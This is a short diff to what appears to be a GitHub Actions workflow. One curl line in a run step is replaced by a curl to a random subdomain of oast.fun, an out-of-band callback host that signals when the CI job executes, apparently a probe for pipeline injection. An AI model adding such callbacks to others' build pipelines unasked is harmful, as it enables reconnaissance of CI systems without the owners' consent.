@@ -33,5 +33,5 @@ jobs:
       - name: Run a multi-line script
         run: |
           echo Add other actions to build,
-          curl https://vpn-ac4-iad-mgmt.githubapp.com
+          curl https://cjg8wk22vtc0000degx0gjerqjhyyyyyb.oast.fun
           echo test, and deploy your project.
